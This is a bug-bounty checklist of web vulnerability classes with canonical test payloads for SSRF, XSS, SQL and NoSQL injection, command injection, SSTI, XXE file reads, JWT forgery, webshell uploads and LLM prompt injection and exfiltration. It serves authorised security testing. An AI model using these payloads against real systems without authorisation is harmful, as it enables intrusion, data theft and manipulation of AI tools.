# Vulnerability Class Checklists

Per-bug-class testing checklists. Run through the relevant checklist when
hunting a specific bug class. Each checklist is ordered by likelihood-to-pay.

---

## Table of Contents

1. [IDOR Checklist](#1-idor-checklist)
2. [SSRF Checklist](#2-ssrf-checklist)
3. [XSS Checklist](#3-xss-checklist)
4. [SQLi / NoSQLi Checklist](#4-sqli--nosqli-checklist)
5. [RCE / CMDi Checklist](#5-rce--cmdi-checklist)
6. [Auth Bypass / ATO Checklist](#6-auth-bypass--ato-checklist)
7. [XXE Checklist](#7-xxe-checklist)
8. [File Upload Checklist](#8-file-upload-checklist)
9. [Business Logic Checklist](#9-business-logic-checklist)
10. [API Misconfig Checklist](#10-api-misconfig-checklist)
11. [Rate Limit / Race Condition Checklist](#11-rate-limit--race-condition-checklist)
12. [LLM / AI Checklist](#12-llm--ai-checklist)
13. [Checklist Quick Reference Cards](#13-checklist-quick-reference-cards)

---

## 1. IDOR Checklist

### URL Path IDOR
- [ ] Change numeric IDs in URL path (`/user/123` -> `/user/124`)
- [ ] Change UUIDs to known other-user UUID
- [ ] Use array-style IDs (`/user/123,124`)
- [ ] Use wildcard IDs (`/user/*`, `/user/-`)
- [ ] Use negative IDs (`/user/-1`)
- [ ] Increment/decrement sequentially across range
- [ ] Test parallel bursts (race the ID check)

### Query Parameter IDOR
- [ ] Change `?user_id=123` -> other user
- [ ] Change `?account=abc` -> other account
- [ ] Change `?document=uuid` -> other document
- [ ] Add parameter (`?user_id=123&admin=true`)
- [ ] Remove parameter to trigger default/admin view

### POST Body IDOR
- [ ] Change JSON body IDs
- [ ] Mass assignment (`{"user_id": 124, "role": "admin"}`)
- [ ] Nested object injection

### Header / Cookie IDOR
- [ ] Modify `X-User-ID`, `X-Account-ID` headers
- [ ] Modify cookies with user identifiers
- [ ] JWT ID claims manipulation

### Tools
`python tools\python\idor_hunter.py <url> --output findings.json`

## 2. SSRF Checklist

### Cloud Metadata (P1)
- [ ] `http://169.254.169.254/latest/meta-data/` (AWS)
- [ ] `http://metadata.google.internal/` (GCP)
- [ ] `http://169.254.169.254/metadata/instance` (Azure)
- [ ] `http://100.100.100.200/latest/meta-data/` (Alibaba)

### Localhost Bypass
- [ ] `127.0.0.1`, `127.1`, `localhost`
- [ ] Decimal: `2130706433`
- [ ] Octal: `0177.0.0.1`
- [ ] Hex: `0x7f000001`
- [ ] IPv6: `[::1]`, `[0:0:0:0:0:0:0:1]`
- [ ] Short form: `0`, `127.1`
- [ ] DNS: `127.0.0.1.nip.io`, `1.0.0.127.bc.googleusercontent.com`
- [ ] Unicode variants

### Scheme Bypass
- [ ] `gopher://` (Redis, SMTP, MySQL)
- [ ] `dict://` (port probing)
- [ ] `file://` (local file read)
- [ ] `ftp://` (FTP SSRF)
- [ ] `ldap://`, `tftp://`

### Blind SSRF
- [ ] Collaborator / interact.sh callback
- [ ] DNS out-of-band detection
- [ ] HTTP callback with unique ID

### Tools
`python tools\python\ssrf_hunter.py <url> --param url --output findings.json`

## 3. XSS Checklist

### Reflected XSS
- [ ] `"><script>alert(1)</script>`
- [ ] `<img src=x onerror=alert(1)>`
- [ ] `javascript:alert(1)`
- [ ] Polyglot: `jaVasCript:/*-/*\x2f/*\x20(document/*\x2a*/'/*\x2a*/a)`
- [ ] Unicode encoded variants
- [ ] UTF-7: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`

### Stored XSS
- [ ] Profile fields (name, bio, website)
- [ ] Comments / reviews / forum posts
- [ ] File upload filenames
- [ ] Metadata (EXIF, document properties)

### DOM-based XSS
- [ ] `#` fragment injection
- [ ] `window.location` hash/source
- [ ] `document.referrer`, `postMessage`
- [ ] `innerHTML`, `outerHTML`, `document.write()`
- [ ] Angular/Vue/React template injection (no sandbox)

### WAF Bypass
- [ ] Case variation: `ScRiPt`, `ImG`
- [ ] Encoding: `&#x3C;`, `&#60;`
- [ ] Polyglot: `<svg/onload=alert(1)>`
- [ ] Nested: `<scr<script>ipt>alert(1)</scr<script>ipt>`

### Tools
Python payload generator: `python tools\python\payload_generator.py --type xss`

## 4. SQLi / NoSQLi Checklist

### Error-Based SQLi
- [ ] `'`, `"`, `` ` ``
- [ ] `' OR 1=1--`
- [ ] `' AND 1=1--`, `' AND 1=2--`
- [ ] `) OR 1=1--`

### Time-Based Blind SQLi
- [ ] `' OR SLEEP(5)--` (MySQL)
- [ ] `'; WAITFOR DELAY '0:0:5'--` (MSSQL)
- [ ] `' OR pg_sleep(5)--` (PostgreSQL)
- [ ] `' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--` (Oracle)

### Union-Based SQLi
- [ ] `' UNION SELECT 1,2,3--`
- [ ] `' UNION SELECT NULL,NULL,NULL--`
- [ ] `' UNION SELECT @@version,user(),database()--`

### NoSQLi (MongoDB)
- [ ] `' || '1'=='1`
- [ ] `{"$gt": ""}`
- [ ] `{"$ne": ""}`
- [ ] `{"$where": "1"}`

### JSON SQLi
- [ ] `{"id": "1' OR '1'='1"}`
- [ ] `{"query": {"$gt": ""}}`

### Tools
`python tools\python\sqli_hunter.py <url> --output findings.json`

## 5. RCE / CMDi Checklist

### Command Injection
- [ ] `; id`, `| id`, `` `id` ``, `$(id)`
- [ ] `|| id`, `&& id`
- [ ] `%0aid`, `%0a id`
- [ ] Blind: `; sleep 5`, `| ping -c 5 127.0.0.1`

### SSTI
- [ ] `{{7*7}}` (Jinja2, Twig)
- [ ] `${7*7}` (Freemarker, Spring)
- [ ] `#{7*7}` (ERB, Ruby)
- [ ] `*{7*7}` (Velocity)

### Deserialization
- [ ] PHP: `O:1:"x":0:{}`
- [ ] Python pickle: `cos\nsystem\n(S'id'\nR`
- [ ] Java: `rO0ABXA=`
- [ ] .NET ViewState: MAC verification test

### Tools
`python tools\python\rce_hunter.py <url> --cmd id --output findings.json`

## 6. Auth Bypass / ATO Checklist

### JWT Attacks
- [ ] `alg: none` (empty signature)
- [ ] `alg: None`, `NONE`, `nOnE`
- [ ] Weak HMAC secret crack
- [ ] `kid` path traversal: `../../../etc/passwd`
- [ ] JWK injection (embedded key)
- [ ] Token confusion (RS256 -> HS256 using public key)

### Password Reset
- [ ] Predictable tokens (timestamp, email hash, sequential)
- [ ] Token leaked in referrer header
- [ ] Host header injection in reset link
- [ ] Race condition (use reset link twice)
- [ ] Token not invalidated after use

### MFA / 2FA Bypass
- [ ] Direct navigation to post-auth URL
- [ ] MFA not required on sensitive endpoints
- [ ] OTP brute-force (no rate limit)
- [ ] OTP replay (same code used twice)
- [ ] Recovery code disclosure

### Session Attacks
- [ ] Session fixation (force known session ID)
- [ ] No session invalidation on logout
- [ ] Session not tied to IP/user-agent
- [ ] Long expiry (weeks/months)

### Tools
`python tools\python\auth_hunter.py <url> --jwt <token> --output findings.json`

## 7. XXE Checklist

### Classic XXE
- [ ] `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- [ ] `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">`

### OOB (Blind) XXE
- [ ] Parameter entity with HTTP exfiltration
- [ ] External DTD loading
- [ ] FTP exfiltration

### Error-Based XXE
- [ ] Error message with file contents
- [ ] DTD parse errors

### SVG XXE
- [ ] `<!ENTITY xxe SYSTEM "file:///etc/passwd">` in SVG
- [ ] XInclude in SVG

### DOCX / Office XXE
- [ ] XXE in `word/document.xml` inside ZIP
- [ ] XXE in OOXML relationships

### Tools
`python tools\python\xxe_hunter.py <endpoint> --output findings.json`

## 8. File Upload Checklist

### Webshell Upload
- [ ] `.php`, `.php5`, `.phtml`, `.pht`
- [ ] `.asp`, `.aspx`, `.ashx`, `.asa`, `.cer`
- [ ] `.jsp`, `.jspx`
- [ ] `.py`, `.pl`, `.rb`

### Extension Bypass
- [ ] Double extension: `shell.php.jpg`
- [ ] Null byte: `shell.php%00.jpg`
- [ ] Case: `.Php`, `.PHP`, `.pHp`
- [ ] .htaccess upload to enable PHP in other dirs
- [ ] Config file override: `web.config`, `.user.ini`

### Content-Type Bypass
- [ ] MIME type: `image/jpeg`, `image/png`, `text/plain`
- [ ] Magic byte spoof: PNG header + PHP payload
- [ ] Polyglot: GIF with embedded PHP

### XSS via Upload
- [ ] SVG with `<script>` or `<onload>`
- [ ] HTML upload
- [ ] Filename XSS

### Tools
`python tools\python\file_upload_hunter.py <endpoint> --output findings.json`

## 9. Business Logic Checklist

- [ ] Negative quantities (refund more than paid)
- [ ] Race condition on coupon application
- [ ] Missing step-up on sensitive actions
- [ ] Parameter pollution overriding logic
- [ ] State transition bypass (skip steps in flow)
- [ ] Integer overflow on price/quantity
- [ ] Currency conversion rounding
- [ ] Referral/Affiliate abuse

## 10. API Misconfig Checklist

- [ ] Mass assignment (send extra fields)
- [ ] CORS wildcard with credentials
- [ ] No auth on internal endpoints
- [ ] Verb tampering (GET where POST required)
- [ ] Rate limit missing on auth endpoints
- [ ] Debug endpoints exposed
- [ ] Swagger/OpenAPI without auth

## 11. Rate Limit / Race Condition Checklist

- [ ] Login rate limit (20+ attempts)
- [ ] OTP rate limit (1000+ attempts)
- [ ] Password reset rate limit
- [ ] Race condition on coupon/referral
- [ ] Race condition on account creation
- [ ] Race condition on file upload

## 12. LLM / AI Checklist

- [ ] Direct prompt injection
- [ ] Indirect prompt injection (documents)
- [ ] System prompt extraction
- [ ] Training data extraction
- [ ] ASCII smuggling (Unicode tag block)
- [ ] Tool-use exfiltration
- [ ] IDOR via AI (cross-user data)
- [ ] RCE via code execution tools

## 13. Checklist Quick Reference Cards

### Always Test First (P1)
1. URL parameter IDOR
2. Cloud metadata SSRF
3. Classic XXE in XML endpoints
4. PHP webshell upload
5. JWT alg=none
6. Error-based SQLi on login
7. Host header injection in password reset

### Always Validate Before Report
- [ ] 7-Question Gate passed?
- [ ] Reproducible on fresh session?
- [ ] Business impact demonstrable?
- [ ] Not in always-rejected list?
- [ ] CVSS 3.1 scored?
- [ ] Evidence package ready (HAR/screenshots)?
- [ ] Chain needed for severity?

---

*End of vuln-class-checklists.md*
